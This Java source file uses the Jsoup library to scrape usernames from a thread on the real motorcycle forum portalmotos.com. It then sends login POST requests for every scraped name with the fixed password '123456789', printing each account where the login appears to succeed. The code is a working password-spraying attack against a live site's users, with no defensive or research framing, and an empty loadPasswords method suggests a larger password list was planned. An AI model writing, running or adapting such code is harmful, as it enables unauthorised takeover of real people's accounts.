package com.youtubers;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;


import java.util.HashMap;
import java.util.Map;


public class Requests {

    public Requests () {
        System.out.println("Scanning for users...");
        Map<String, User> userList = this.loadUsers();
        System.out.println("Users scanned: " + userList.size() + " users.");

        System.out.println("Sending Post requests...");
        this.sendPost(userList);


    }

    // Returns a HashMap with all userNames.
    public Map <String, User>  loadUsers () {
        try {
            Map <String, User> userList = new HashMap<>();
            String url = "http://www.portalmotos.com/modulos/foros/tema.asp?TemaId=76490&pagina=";
            int numberOfPages = 86;

            for (int i = 1; i < numberOfPages; i++) {
                String page = String.valueOf(i);
                Document document = Jsoup.connect(url + page).get();
                Elements userNames = document.select("tr td a b");

                for (Element userName: userNames) {
                    if (!userList.containsKey(userName.html())) {
                        if (userName.html().startsWith("<")) {
                            String user = userName.select("span").html();
                            userList.put( user , new User(user));
                        }
                        else {
                            userList.put(userName.html() , new User(userName.html()));
                        }
                    }
                }
            }
            userList.put("juan123456" , new User("juan123456"));
            return userList;
        }
        catch (Exception e) {
            System.out.println(e);
            return null;
        }
    }

    public void loadPasswords () {
        
    }

    public void sendPost (Map <String, User> userList) {
        try {

            String url = "http://www.portalmotos.com/modulos/usuarios/login.asp";
            int userCount = 1;

            for (String user : userList.keySet()) {
                String userName = user;
                String password = "123456789";

                Connection.Response response0 = Jsoup.connect(url)
                        .method(Connection.Method.GET)
                        .execute();

                String sessionId = response0.cookie("ASPSESSIONIDASRAARRD");

                try {
                    Connection.Response response = Jsoup.connect(url)
                            .method(Connection.Method.POST)
                            .data("UsuarioNick", userName)
                            .data("Clave", password)
                            .data("Modo", "conectar")
                            .data("ret_page", "")
                            .data("submit", "Conectar")
                            .cookie("ASPSESSIONIDASRAARRD", sessionId)
                            .userAgent("Mozilla/5.0")
                            .followRedirects(true)
                            .execute();

                    if (!String.valueOf(response.url()).equals(url)) {
                        System.out.println("Success - Username: " + userName + ", Password: " + password + " " + response.url() + "\n");
                    }
                    else {
                        System.out.println("Failed - user " + userCount++ + "/" + userList.size() + " " + response.url() + " " + userName + " " + password);
                    }

                }
                catch (Exception e) {
                    System.out.println("Success - Username: " + userName + ", Password: " + password + " " + "\n");
                    continue;
                }

            }
        }
        catch (Exception e) {
            System.out.println(e);
        }
    }

}
